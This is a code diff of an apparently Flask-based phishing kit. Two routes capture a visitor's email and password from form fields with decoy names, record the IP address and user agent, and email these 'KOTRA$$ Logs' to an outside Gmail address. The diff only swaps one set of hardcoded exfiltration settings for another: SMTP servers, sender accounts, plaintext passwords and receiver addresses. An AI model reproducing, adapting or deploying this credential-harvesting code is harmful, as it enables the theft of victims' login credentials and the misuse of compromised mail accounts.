@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "notificationalibaba@gmail.com"
-        password = "vip7a81be0e2b36"
+        sender_email = "peterliew@2mc.com.my"
+        sender_emaill = "peterliew"
+        receiver_email = "florencejose36@gmail.com"
+        password = "P@sswoRD*00028"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,8 +210,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_ssl("mail.2mc.com.my", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "notificationalibaba@gmail.com"
-        password = "vip7a81be0e2b36"
+        sender_email = "peterliew@2mc.com.my"
+        sender_emaill = "peterliew"
+        receiver_email = "florencejose36@gmail.com"
+        password = "P@sswoRD*00028"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,8 +250,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_ssl("mail.2mc.com.my", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
